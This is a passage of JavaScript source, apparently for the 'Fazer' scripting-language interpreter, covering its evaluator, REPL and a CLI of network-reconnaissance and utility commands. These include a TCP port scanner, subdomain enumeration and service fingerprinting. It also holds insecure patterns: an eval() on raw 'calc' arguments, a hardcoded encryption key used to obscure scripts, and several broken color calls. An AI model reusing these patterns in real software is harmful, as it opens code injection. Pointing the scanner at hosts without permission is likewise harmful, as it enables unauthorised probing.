           // Reuse the scope? Or new scope per iteration?
           // Typically new scope per iteration for locals.
           const inner = new Scope(scope);
           const out = await this._execBlock(stmt.body, inner);
           if (out instanceof ReturnSignal) return out;
           last = out;
        }
        return last;
      }

      case "try": {
        try {
           const inner = new Scope(scope);
           const out = await this._execBlock(stmt.tryBlock, inner);
           if (out instanceof ReturnSignal) return out;
           return out;
        } catch (e) {
           const inner = new Scope(scope);
           // Fix: Store raw string, not object wrapper
           inner.set(stmt.errVar, e.message || String(e), false);
           const out = await this._execBlock(stmt.catchBlock, inner);
           if (out instanceof ReturnSignal) return out;
           return out;
        }
      }

      case "case": {
        const val = await this._eval(stmt.expr, scope);
        for (const arm of stmt.arms) {
          const { matched, bindings } = await this._matchPattern(val, arm.pat, scope);
          if (matched) {
            const inner = new Scope(scope);
            for (const [k, v] of Object.entries(bindings)) inner.set(k, v, true);
            const out = await this._execBlock(arm.body, inner);
            if (out instanceof ReturnSignal) return out;
            return out;
          }
        }
        return null;
      }

      default:
        throw new FazerError(`Unknown statement type: ${stmt.type}`);
    }
  }

  async _eval(expr, scope) {
    if (!expr) return null;

    // Check debugger
    await this._debugCheck(expr, scope);

    switch (expr.type) {
      case "num":
      case "str":
      case "bool":
        return expr.value;

      case "null":
        return null;

      case "list": {
        const items = [];
        for (const it of expr.items) items.push(await this._eval(it, scope));
        return items;
      }

      case "map": {
        const o = {};
        for (const ent of expr.entries) {
          const k = await this._eval(ent.key, scope);
          o[String(k)] = await this._eval(ent.value, scope);
        }
        return o;
      }

      case "fn": {
        const anonName = `__anon_${Math.random().toString(36).substr(2)}`;
        this.fns.set(anonName, { params: expr.params, body: expr.body, closure: scope });
        return { __fnref__: anonName };
      }

      case "ident": {
        const cell = scope.get(expr.name);
        if (!cell) throw new FazerError(`Undefined variable '${expr.name}'`);
        const v = cell.value;
        if (v && typeof v === "object" && v.__fnref__) return v;
        return v;
      }

      case "un": {
        const v = await this._eval(expr.expr, scope);
        if (expr.op === "not") return !truthy(v);
        if (expr.op === "-") return -Number(v);
        throw new FazerError(`Unknown unary op ${expr.op}`);
      }

      case "bin": {
        if (expr.op === "and") {
          const l = await this._eval(expr.left, scope);
          if (!truthy(l)) return l;
          return await this._eval(expr.right, scope);
        }
        if (expr.op === "or") {
          const l = await this._eval(expr.left, scope);
          if (truthy(l)) return l;
          return await this._eval(expr.right, scope);
        }

        const l = await this._eval(expr.left, scope);
        const r = await this._eval(expr.right, scope);

        switch (expr.op) {
          case "+": return (typeof l === "string" || typeof r === "string") ? String(l) + String(r) : Number(l) + Number(r);
          case "-": return Number(l) - Number(r);
          case "*": return Number(l) * Number(r);
          case "/": return Number(l) / Number(r);
          case "%": return Number(l) % Number(r);

          case "==": return deepEqual(l, r);
          case "!=": return !deepEqual(l, r);
          case ">": return Number(l) > Number(r);
          case "<": return Number(l) < Number(r);
          case ">=": return Number(l) >= Number(r);
          case "<=": return Number(l) <= Number(r);
          default:
            throw new FazerError(`Unknown binary op ${expr.op}`);
        }
      }

      case "get": {
        const obj = await this._eval(expr.obj, scope);
        const key = await this._eval(expr.key, scope);
        const v = (obj == null) ? null : obj[String(key)];
        return v === undefined ? null : v;
      }

      case "idx": {
        const obj = await this._eval(expr.obj, scope);
        const idx = await this._eval(expr.idx, scope);
        if (obj == null) return null;
        if (Array.isArray(obj)) return obj[Number(idx)] === undefined ? null : obj[Number(idx)];
        return obj[String(idx)] === undefined ? null : obj[String(idx)];
      }

      case "call": {
        // Method call support: preserve 'this' context
        if (expr.callee.type === "get") {
            const obj = await this._eval(expr.callee.obj, scope);
            if (obj != null) {
                const key = await this._eval(expr.callee.key, scope);
                const func = obj[String(key)];
                if (typeof func === "function") {
                    const args = [];
                    for (const a of expr.args) args.push(await this._eval(a, scope));
                    return await func.apply(obj, args);
                }
            }
        }

        const callee = await this._eval(expr.callee, scope);
        const args = [];
        for (const a of expr.args) args.push(await this._eval(a, scope));
        return await this._call(callee, args, scope);
      }

      case "pipe": {
        const leftVal = await this._eval(expr.left, scope);
        const rightNode = expr.right;

        if (rightNode.type === "call") {
          const callee = await this._eval(rightNode.callee, scope);
          const args = [leftVal];
          for (const a of rightNode.args) args.push(await this._eval(a, scope));
          return await this._call(callee, args, scope);
        }

        if (rightNode.type === "ident") {
          const fn = await this._eval(rightNode, scope);
          return await this._call(fn, [leftVal], scope);
        }

        const fn = await this._eval(rightNode, scope);
        return await this._call(fn, [leftVal], scope);
      }

      default:
        throw new FazerError(`Unknown expression type: ${expr.type}`);
    }
  }

  async _call(callee, args, scope) {
    if (typeof callee === "function") return await callee(...args);

    // Support calling by string name (e.g. from callbacks stored as strings)
    if (typeof callee === "string") {
      if (this.fns.has(callee)) {
        callee = { __fnref__: callee };
      } else {
        // Try to look up variable in scope, maybe it's a function ref
        const cell = scope.get(callee);
        if (cell && cell.value && cell.value.__fnref__) {
            callee = cell.value;
        }
      }
    }

    if (callee && typeof callee === "object" && callee.__fnref__) {
      const name = callee.__fnref__;
      const fn = this.fns.get(name);
      if (!fn) throw new FazerError(`Unknown function '${name}'`);
      if (args.length !== fn.params.length) {
        throw new FazerError(`Arity mismatch: ${name} expects ${fn.params.length}, got ${args.length}`);
      }
      const inner = new Scope(fn.closure);
      for (let i = 0; i < fn.params.length; i++) inner.set(fn.params[i], args[i], true);
      const out = await this._execBlock(fn.body, inner);
      if (out instanceof ReturnSignal) return out.value;
      return out;
    }

    throw new FazerError(`Value is not callable`);
  }

  async _matchPattern(value, pat, scope) {
    if (!pat) return { matched: false, bindings: {} };

    if (pat.type === "else") return { matched: true, bindings: {} };

    if (pat.type === "identPat") {
      // binding: case x  name → ...
      return { matched: true, bindings: { [pat.name]: value } };
    }

    if (pat.type === "cmpPat") {
      const rhs = await this._eval(pat.rhs, scope);
      const op = pat.op;
      let m = false;
      if (op === "==") m = deepEqual(value, rhs);
      else if (op === "!=") m = !deepEqual(value, rhs);
      else if (op === ">") m = (value > rhs);
      else if (op === "<") m = (value < rhs);
      else if (op === ">=") m = (value >= rhs);
      else if (op === "<=") m = (value <= rhs);
      
      return { matched: m, bindings: {} };
    }

    if (pat.type === "num" || pat.type === "str" || pat.type === "bool") {
        return { matched: deepEqual(value, pat.value), bindings: {} };
    }

    if (pat.type === "null") {
        return { matched: value === null, bindings: {} };
    }

    return { matched: false, bindings: {} };
  }
}

/* ────────────────────────────────────────────────────────────────────────── */
/* Utilities                                                                    */
/* ────────────────────────────────────────────────────────────────────────── */

function unescapeString(rawTokenImage) {
  // rawTokenImage includes quotes
  const s = rawTokenImage.slice(1, -1);
  // minimal escapes
  return s
    .replace(/\\n/g, "\n")
    .replace(/\\r/g, "\r")
    .replace(/\\t/g, "\t")
    .replace(/\\"/g, '"')
    .replace(/\\\\/g, "\\");
}

function locOf(tok) {
  return {
    offset: tok.startOffset,
    line: tok.startLine,
    col: tok.startColumn,
    endOffset: tok.endOffset,
    endLine: tok.endLine,
    endCol: tok.endColumn,
  };
}

function truthy(v) {
  return !!v;
}

function deepEqual(a, b) {
  if (a === b) return true;
  if (a == null || b == null) return a === b;
  if (typeof a !== typeof b) return false;
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) return false;
    for (let i = 0; i < a.length; i++) if (!deepEqual(a[i], b[i])) return false;
    return true;
  }
  if (typeof a === "object" && typeof b === "object") {
    const ka = Object.keys(a);
    const kb = Object.keys(b);
    if (ka.length !== kb.length) return false;
    for (const k of ka) if (!deepEqual(a[k], b[k])) return false;
    return true;
  }
  return false;
}

function prettyError(err, filename, code) {
  const lines = String(code).split(/\r?\n/);
  const meta = err && err.meta ? err.meta : null;
  if (!meta || !meta.line) return `${err.name}: ${err.message}`;

  const lineNo = meta.line;
  const col = meta.col || 1;
  const line = lines[lineNo - 1] ?? "";
  const caret = " ".repeat(Math.max(0, col - 1)) + "^";

  return [
    `${err.name}: ${err.message}`,
    `at ${filename}:${lineNo}:${col}`,
    line,
    caret,
  ].join("\n");
}

/* ────────────────────────────────────────────────────────────────────────── */
/* REPL                                                                         */
/* ────────────────────────────────────────────────────────────────────────── */

async function repl() {
  const readline = require("readline");
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: "\x1b[36mfz>\x1b[0m "
  });

  const version = require("./package.json").version;
  const arch = process.arch;
  const platform = process.platform;
  
  process.title = `Fazer v${version}`;
  
  console.log(`Fazer v${version} (${platform}-${arch})`);
  console.log(`Type "help", "copyright" or "license" for more information.`);
  console.log(`Type "load('file.fz')" to execute a script.`);

  const rt = new FazerRuntime({ filename: "<repl>", args: [] });

  // Add a helper to run files
  rt.global.set("load", (p) => {
    const pAbs = path.resolve(String(p));
    if (!fs.existsSync(pAbs)) throw new FazerError("File not found: " + p);
    const code = fs.readFileSync(pAbs, "utf8");
    const lex = lexer.tokenize(code);
    if (lex.errors.length) throw new FazerError("Lexer error: " + lex.errors[0].message);
    const parser = new FazerParser();
    parser.input = lex.tokens;
    const ast = parser.program();
    if (parser.errors.length) throw new FazerError("Parser error: " + parser.errors[0].message);
    return rt.run(ast);
  }, false);

  rl.prompt();

  for await (const line of rl) {
    const code = line.trim();
    if (code === "exit") break;
    if (code === "") {
      rl.prompt();
      continue;
    }

    try {
      const lex = lexer.tokenize(code);
      if (lex.errors.length) {
        console.error("Syntax Error: " + lex.errors[0].message);
      } else {
        const parser = new FazerParser();
        parser.input = lex.tokens;
        const ast = parser.program();
        
        if (parser.errors.length) {
           console.error("Parse Error: " + parser.errors[0].message);
        } else {
           // Execute with existing global scope
           const res = await rt.run(ast);
           if (res !== null && res !== undefined) {
             const builtins = rt.global.get("__builtins__");
             if (builtins && builtins.style) {
                console.log(builtins.style(res, "green"));
             } else {
                console.log("\x1b[32m" + String(res) + "\x1b[0m");
             }
           }
        }
      }
    } catch (e) {
      console.error("\x1b[31mError: " + (e.message || e) + "\x1b[0m");
    }
    rl.prompt();
  }
}

/* ────────────────────────────────────────────────────────────────────────── */
/* CLI                                                                          */
/* ────────────────────────────────────────────────────────────────────────── */

function usage() {
  console.log(`
Fazer v${require("./package.json").version} — The next-gen pipe-based language.

Usage:
  fazer                     Start interactive shell (REPL)
  fazer <file.fz> [args...] Run a Fazer script
  fazer run <file.fz>       Run a Fazer script (explicit)

CLI Commands:
  Network/OSINT:
    geo, scan, whois, sub, dns, tech, headers, ip, ping, 
    ssl, curl, robots
  
  Crypto/Encoding:
    b64, hex, url, md5, sha1, sha256, uuid
    
  System/Utils:
    ls, cat, grep, wc, whoami, env, pass, calc, now, coin, dice

Flags:
  --help, -h                Show this help message
  --version, -v             Show version
  --license                 Show license information
`);
  process.exit(0);
}

function printLicense() {
  console.log(`
Fazer Language
Copyright (c) 2026 L'EMPRISE

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
`);
  process.exit(0);
}

async function main() {
  const argv = process.argv.slice(2);

  if (argv.length === 0) {
    await repl();
    return;
  }

  const cmd = argv[0];

  if (cmd === "--help" || cmd === "-h") {
    usage();
  }
  if (cmd === "--version" || cmd === "-v") {
    console.log(`Fazer v${require("./package.json").version}`);
    process.exit(0);
  }
  if (cmd === "--license") {
    printLicense();
  }

  /* ────────────────────────────────────────────────────────────────────────── */
  /* CLI TOOLS / OSINT                                                          */
  /* ────────────────────────────────────────────────────────────────────────── */
  
  const colors = {
      red: "\x1b[31m", green: "\x1b[32m", yellow: "\x1b[33m", blue: "\x1b[34m", 
      magenta: "\x1b[35m", cyan: "\x1b[36m", reset: "\x1b[0m", bold: "\x1b[1m"
  };
  
  const CLI_COMMANDS = {
      // --- OSINT / NETWORK ---
      "geo": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer geo <ip/domain>${colors.reset}`);
          const target = args[0];
          console.log(`${colors.cyan}[*] Geo-locating: ${target}...${colors.reset}`);
          const http = require("http");
          http.get(`http://ip-api.com/json/${target}`, (res) => {
              let data = "";
              res.on("data", c => data += c);
              res.on("end", () => {
                  try {
                      const j = JSON.parse(data);
                      if (j.status === "fail") {
                          console.log(`${colors.red}[!] Failed: ${j.message}${colors.reset}`);
                          return;
                      }
                      console.log(`${colors.green}[+] Target: ${j.query}${colors.reset}`);
                      console.log(`    ${colors.bold}Country:${colors.reset} ${j.country} (${j.countryCode})`);
                      console.log(`    ${colors.bold}Region:${colors.reset}  ${j.regionName} (${j.region})`);
                      console.log(`    ${colors.bold}City:${colors.reset}    ${j.city}`);
                      console.log(`    ${colors.bold}ISP:${colors.reset}     ${j.isp}`);
                      console.log(`    ${colors.bold}Org:${colors.reset}     ${j.org}`);
                      console.log(`    ${colors.bold}AS:${colors.reset}      ${j.as}`);
                      console.log(`    ${colors.bold}Loc:${colors.reset}     ${j.lat}, ${j.lon}`);
                      console.log(`    ${colors.blue}Maps:${colors.reset}    https://www.google.com/maps?q=${j.lat},${j.lon}`);
                  } catch(e) { console.error(e.message); }
              });
          }).on("error", e => console.error(e.message));
      },

      "ip": async (args) => {
          console.log(`${colors.cyan}[*] Fetching public IP...${colors.reset}`);
          const https = require("https");
          https.get("https://api.ipify.org?format=json", (res) => {
              let data = "";
              res.on("data", c => data += c);
              res.on("end", () => {
                  try {
                      const j = JSON.parse(data);
                      console.log(`${colors.green}[+] Public IP: ${colors.bold}${j.ip}${colors.reset}`);
                  } catch(e) { console.error("Error parsing response"); }
              });
          }).on("error", e => console.error(e.message));
      },

      "ping": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer ping <host> [port]${colors.reset}`);
          const host = args[0];
          const port = args[1] ? parseInt(args[1]) : 80;
          console.log(`${colors.cyan}[*] Pinging ${host}:${port}...${colors.reset}`);
          const net = require("net");
          const start = Date.now();
          const s = new net.Socket();
          s.setTimeout(2000);
          s.on('connect', () => {
              const ms = Date.now() - start;
              console.log(`${colors.green}[+] Connected to ${host}:${port} in ${ms}ms${colors.reset}`);
              s.destroy();
          });
          s.on('timeout', () => { console.log(`${colors.red}[!] Timeout${colors.reset}`); s.destroy(); });
          s.on('error', (e) => { console.log(`${colors.red}[!] Error: ${e.message}${colors.reset}`); });
          s.connect(port, host);
      },

      "scan": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer scan <host> [ports/range]${colors.reset}`);
          const host = args[0];
          let ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443];
          if (args[1]) {
              if (args[1] === "full") ports = Array.from({length: 1024}, (_, i) => i + 1);
              else ports = args[1].split(",").map(p => parseInt(p.trim())).filter(n => !isNaN(n));
          }
          
          console.log(`${colors.cyan}[*] Scanning ${host} (${ports.length} ports)...${colors.reset}`);
          const net = require("net");
          
          const checkPort = (port) => new Promise(resolve => {
              const s = new net.Socket();
              s.setTimeout(2000);
              s.on('connect', () => { s.destroy(); resolve(port); });
              s.on('timeout', () => { s.destroy(); resolve(null); });
              s.on('error', () => resolve(null));
              s.connect(port, host);
          });
          
          const results = await Promise.all(ports.map(checkPort));
          const open = results.filter(p => p !== null);
          
          if (open.length === 0) console.log(`${colors.yellow}[-] No open ports found.${colors.reset}`);
          else {
              console.log(`${colors.green}[+] Found ${open.length} open ports:${colors.reset}`);
              open.forEach(p => console.log(`    - ${colors.bold}${p}${colors.reset} (OPEN)`));
          }
      },

      "whois": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer whois <domain>${colors.reset}`);
          const domain = args[0];
          console.log(`${colors.cyan}[*] WHOIS Lookup for: ${domain}...${colors.reset}`);
          
          const queryWhois = (server, query) => new Promise((resolve, reject) => {
              const net = require("net");
              const s = new net.Socket();
              let data = "";
              s.connect(43, server, () => s.write(query + "\r\n"));
              s.on("data", d => data += d);
              s.on("end", () => resolve(data));
              s.on("error", reject);
          });
          
          try {
              let res = await queryWhois("whois.iana.org", domain);
              let refer = res.match(/refer:\s+(.+)/i);
              if (refer && refer[1]) {
                  const server = refer[1].trim();
                  console.log(`${colors.blue}[i] Redirected to ${server}${colors.reset}`);
                  res = await queryWhois(server, domain);
              } else {
                  if (domain.endsWith(".com") || domain.endsWith(".net")) {
                       res = await queryWhois("whois.verisign-grs.com", domain);
                  }
              }
              console.log(res);
          } catch(e) { console.error(`${colors.red}[!] Error: ${e.message}${colors.reset}`); }
      },

      "dns": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer dns <domain>${colors.reset}`);
          const domain = args[0];
          const dns = require("dns").promises;
          console.log(`${colors.cyan}[*] DNS Records for: ${domain}${colors.reset}`);
          const types = ["A", "AAAA", "MX", "TXT", "NS", "SOA", "CNAME"];
          for (const t of types) {
              try {
                  const res = await dns.resolve(domain, t);
                  console.log(`${colors.bold}[${t}]${colors.reset}`);
                  if (Array.isArray(res)) res.forEach(r => console.log(`    ${typeof r === 'object' ? JSON.stringify(r) : r}`));
                  else console.log(`    ${JSON.stringify(res)}`);
              } catch(e) {}
          }
      },

      "sub": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer sub <domain>${colors.reset}`);
          const domain = args[0];
          console.log(`${colors.cyan}[*] Enumerating subdomains for: ${domain} (via crt.sh)...${colors.reset}`);
          const https = require("https");
          const fetch = (u) => new Promise((resolve, reject) => {
              const req = https.get(u, { headers: {'User-Agent': 'Mozilla/5.0'} }, res => {
                  let d = ""; res.on("data", c => d += c); res.on("end", () => resolve(d));
              });
              req.on("error", reject);
          });
          try {
              const data = await fetch(`https://crt.sh/?q=%.${domain}&output=json`);
              let json = [];
              try { json = JSON.parse(data); } catch(e) { console.log(`${colors.red}[!] Invalid response${colors.reset}`); return; }
              const subs = new Set();
              json.forEach(entry => { entry.name_value.split("\n").forEach(s => subs.add(s)); });
              console.log(`${colors.green}[+] Found ${subs.size} unique subdomains:${colors.reset}`);
              Array.from(subs).sort().forEach(s => console.log(`    ${s}`));
          } catch(e) { console.error(`${colors.red}[!] Error: ${e.message}${colors.reset}`); }
      },

      "headers": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer headers <url>${colors.reset}`);
          let u = args[0]; if (!u.startsWith("http")) u = "https://" + u;
          console.log(`${colors.cyan}[*] Fetching headers: ${u}...${colors.reset}`);
          const proto = u.startsWith("https") ? require("https") : require("http");
          proto.get(u, (res) => {
              console.log(`${colors.green}[${res.statusCode} ${res.statusMessage}]${colors.reset}`);
              Object.keys(res.headers).forEach(k => console.log(`${colors.bold}${k}${colors.reset}: ${res.headers[k]}`));
          }).on("error", e => console.error(e.message));
      },

      "tech": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer tech <url>${colors.reset}`);
          let u = args[0]; if (!u.startsWith("http")) u = "https://" + u;
          console.log(`${colors.cyan}[*] Detecting tech: ${u}...${colors.reset}`);
          const proto = u.startsWith("https") ? require("https") : require("http");
          proto.get(u, (res) => {
              const h = res.headers;
              console.log(`${colors.bold}Server:${colors.reset}       ${h["server"]||"Unknown"}`);
              console.log(`${colors.bold}X-Powered-By:${colors.reset} ${h["x-powered-by"]||"Unknown"}`);
              if (h["set-cookie"]) {
                  h["set-cookie"].forEach(c => {
                      if (c.includes("PHPSESSID")) console.log(`${colors.magenta}[!] PHP Detected${colors.reset}`);
                      if (c.includes("JSESSIONID")) console.log(`${colors.magenta}[!] Java Detected${colors.reset}`);
                      if (c.includes("ASP.NET")) console.log(`${colors.magenta}[!] ASP.NET Detected${colors.reset}`);
                  });
              }
          }).on("error", e => console.error(e.message));
      },
      
      "ssl": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer ssl <host> [port]${colors.reset}`);
          const host = args[0];
          const port = args[1] || 443;
          console.log(`${colors.cyan}[*] Inspecting SSL: ${host}:${port}...${colors.reset}`);
          const tls = require("tls");
          const socket = tls.connect(port, host, { servername: host }, () => {
              const cert = socket.getPeerCertificate();
              if (socket.authorized) console.log(`${colors.green}[+] Authorized${colors.reset}`);
              else console.log(`${colors.yellow}[!] Unauthorized: ${socket.authorizationError}${colors.reset}`);
              console.log(`${colors.bold}Subject:${colors.reset} ${cert.subject.CN} (${cert.subject.O})`);
              console.log(`${colors.bold}Issuer:${colors.reset}  ${cert.issuer.CN} (${cert.issuer.O})`);
              console.log(`${colors.bold}Valid:${colors.reset}   ${cert.valid_from} to ${cert.valid_to}`);
              console.log(`${colors.bold}Fingerprint:${colors.reset} ${cert.fingerprint}`);
              socket.destroy();
          });
          socket.on("error", e => console.error(e.message));
      },

      "curl": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer curl <url>${colors.reset}`);
          let u = args[0]; if (!u.startsWith("http")) u = "https://" + u;
          const proto = u.startsWith("https") ? require("https") : require("http");
          proto.get(u, res => {
              res.pipe(process.stdout);
          }).on("error", e => console.error(e.message));
      },

      "robots": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer robots <url>${colors.reset}`);
          let u = args[0]; if (!u.startsWith("http")) u = "https://" + u;
          u = u.endsWith("/") ? u + "robots.txt" : u + "/robots.txt";
          console.log(`${colors.cyan}[*] Fetching ${u}...${colors.reset}`);
          const proto = u.startsWith("https") ? require("https") : require("http");
          proto.get(u, res => {
              if (res.statusCode !== 200) console.log(`${colors.yellow}[!] Status: ${res.statusCode}${colors.reset}`);
              res.pipe(process.stdout);
          }).on("error", e => console.error(e.message));
      },

      // --- CRYPTO / ENCODING ---
      "b64": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer b64 <enc/dec> <string>${colors.reset}`);
          const mode = args[0]; const str = args.slice(1).join(" ");
          if (mode === "enc") console.log(Buffer.from(str).toString("base64"));
          else if (mode === "dec") console.log(Buffer.from(str, "base64").toString("utf8"));
          else console.log("Unknown mode. Use enc or dec.");
      },

      "hex": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer hex <enc/dec> <string>${colors.reset}`);
          const mode = args[0]; const str = args.slice(1).join(" ");
          if (mode === "enc") console.log(Buffer.from(str).toString("hex"));
          else if (mode === "dec") console.log(Buffer.from(str, "hex").toString("utf8"));
      },

      "md5": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer md5 <string>${colors.reset}`);
          console.log(require("crypto").createHash("md5").update(args.join(" ")).digest("hex"));
      },

      "sha1": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer sha1 <string>${colors.reset}`);
          console.log(require("crypto").createHash("sha1").update(args.join(" ")).digest("hex"));
      },
      
      "sha256": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer sha256 <string>${colors.reset}`);
          console.log(require("crypto").createHash("sha256").update(args.join(" ")).digest("hex"));
      },

      "url": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer url <enc/dec> <string>${colors.reset}`);
          const mode = args[0]; const str = args.slice(1).join(" ");
          if (mode === "enc") console.log(encodeURIComponent(str));
          else if (mode === "dec") console.log(decodeURIComponent(str));
      },

      "uuid": async (args) => {
          console.log(require("crypto").randomUUID());
      },
      
      "compile": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer compile <file.fz> [-o output.fzc]${colors.reset}`);
          const fs = require("fs");
          const path = require("path");
          const crypto = require("crypto");
          
          const inputFile = args[0];
          if (!fs.existsSync(inputFile)) return console.error(`${colors.red}[!] File not found: ${inputFile}${colors.reset}`);
          
          let outputFile = inputFile.replace(/\.fz$/i, ".fzc");
          if (args[1] === "-o" && args[2]) outputFile = args[2];
          
          console.log(`${colors.cyan}[*] Compiling/Encrypting ${inputFile}...${colors.reset}`);
          
          try {
              const content = fs.readFileSync(inputFile, "utf8");
              // Simple obfuscation/encryption using a hardcoded key (Security through obscurity, but sufficient for basic protection)
              // We use AES-256-CTR with a fixed key/iv derived from a salt, or just a simple key.
              // To make it portable, the interpreter must know the key. We'll use a hardcoded key in the interpreter.
              const KEY = Buffer.from("46617a65724c616e675365637265743132334b6579214023", "hex"); // "FazerLangSecret123Key!@#" in hex (24 bytes) - wait, needs 32 for AES-256 or 16 for AES-128
              // Let's use a simpler XOR-based or standard AES approach.
              // We'll use a static key for now so any Fazer interpreter can run it.
              const STATIC_KEY = crypto.createHash('sha256').update("FazerLangPublicRuntimeKey2026").digest();
              const iv = crypto.randomBytes(16);
              const cipher = crypto.createCipheriv('aes-256-cbc', STATIC_KEY, iv);
              let encrypted = cipher.update(content, 'utf8', 'hex');
              encrypted += cipher.final('hex');
              
              // File Format: FZC01[IV_HEX][ENCRYPTED_HEX]
              const data = `FZC01${iv.toString('hex')}${encrypted}`;
              fs.writeFileSync(outputFile, data, "utf8");
              
              console.log(`${colors.green}[+] Success! Compiled to: ${outputFile}${colors.reset}`);
              console.log(`${colors.yellow}[i] You can now distribute '${outputFile}'. It can be run with 'fazer ${outputFile}' but cannot be easily read.${colors.reset}`);
          } catch(e) {
              console.error(`${colors.red}[!] Error: ${e.message}${colors.reset}`);
          }
      },

      // --- SYSTEM / UTILS ---
      "ls": async (args) => {
          const fs = require("fs");
          const p = args[0] || ".";
          try {
              const files = fs.readdirSync(p);
              files.forEach(f => {
                  const stat = fs.statSync(require("path").join(p, f));
                  const isDir = stat.isDirectory();
                  console.log(isDir ? `${colors.blue}${f}/${colors.reset}` : f);
              });
          } catch(e) { console.error(e.message); }
      },

      "cat": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer cat <file>${colors.reset}`);
          try { require("fs").createReadStream(args[0]).pipe(process.stdout); } catch(e) { console.error(e.message); }
      },
      
      "grep": async (args) => {
          if (!args[1]) return console.log(`${colors.red}Usage: fazer grep <pattern> <file>${colors.reset}`);
          const pat = new RegExp(args[0]);
          const file = args[1];
          try {
              const content = require("fs").readFileSync(file, "utf8");
              content.split("\n").forEach((line, i) => {
                  if (pat.test(line)) console.log(`${colors.magenta}${i+1}:${colors.reset} ${line.trim()}`);
              });
          } catch(e) { console.error(e.message); }
      },
      
      "wc": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer wc <file>${colors.reset}`);
          try {
              const c = require("fs").readFileSync(args[0], "utf8");
              console.log(`Lines: ${c.split("\n").length}, Chars: ${c.length}`);
          } catch(e) { console.error(e.message); }
      },
      
      "whoami": async (args) => {
          const os = require("os");
          console.log(`${os.userInfo().username} @ ${os.hostname()} (${os.platform()} ${os.release()})`);
      },
      
      "env": async (args) => {
          Object.keys(process.env).forEach(k => console.log(`${colors.bold}${k}${colors.reset}=${process.env[k]}`));
      },
      
      "pass": async (args) => {
          const len = args[0] ? parseInt(args[0]) : 16;
          const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
          let res = "";
          for(let i=0; i<len; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
          console.log(res);
      },

      "calc": async (args) => {
          if (!args[0]) return console.log(`${colors.red}Usage: fazer calc <expr>${colors.reset}`);
          try { console.log(eval(args.join(" "))); } catch(e) { console.error("Error"); }
      },
      
      "now": async (args) => {
          console.log(new Date().toISOString());
          console.log("Timestamp: " + Date.now());
      },
      
      "coin": async (args) => {
          const r = Math.random() < 0.5 ? "Pile (Heads)" : "Face (Tails)";
          console.log(colors.yellow(r));
      },

      "dice": async (args) => {
          const r = Math.floor(Math.random() * 6) + 1;
          console.log(colors.yellow("🎲 " + r));
      },

      "uptime": async (args) => {
          const up = process.uptime();
          const h = Math.floor(up / 3600);
          const m = Math.floor((up % 3600) / 60);
          const s = Math.floor(up % 60);
          console.log(colors.cyan(`Uptime: ${h}h ${m}m ${s}s`));
      },

      "mem": async (args) => {
          const used = process.memoryUsage();
          console.log(colors.cyan("Memory Usage:"));
          console.log(`  RSS:       ${Math.round(used.rss / 1024 / 1024)} MB`);
          console.log(`  Heap Used: ${Math.round(used.heapUsed / 1024 / 1024)} MB`);
          console.log(`  External:  ${Math.round(used.external / 1024 / 1024)} MB`);
      },

      "disk": async (args) => {
          try {
              require("child_process").exec("wmic logicaldisk get size,freespace,caption", (err, stdout) => {
                  if(err) console.log(colors.red("Error fetching disk info"));
                  else console.log(colors.cyan(stdout.trim()));
              });
          } catch(e) { console.log(colors.red("Disk info unavailable")); }
      },

      "rot13": async (args) => {
          if(!args[0]) return console.log(colors.red("Usage: fazer rot13 <text>"));
          const input = args.join(" ");
          const out = input.replace(/[a-zA-Z]/g, (c) => {
              const base = c <= 'Z' ? 65 : 97;
              return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
          });
          console.log(colors.green(out));
      },

      "reverse": async (args) => {
           if(!args[0]) return console.log(colors.red("Usage: fazer reverse <text>"));
           console.log(colors.green(args.join(" ").split("").reverse().join("")));
      }

  };

  if (CLI_COMMANDS[cmd]) {
      await CLI_COMMANDS[cmd](argv.slice(1));
      return;
  }

  let fileArg = null;
  let forwarded = [];

  // Logic:
  // 1. fazer run file.fz ...
  // 2. fazer file.fz ...
  
  if (cmd === "build") {
    try {
        const builder = require("./tools/builder.js");
        await builder(argv[1], argv.slice(2));
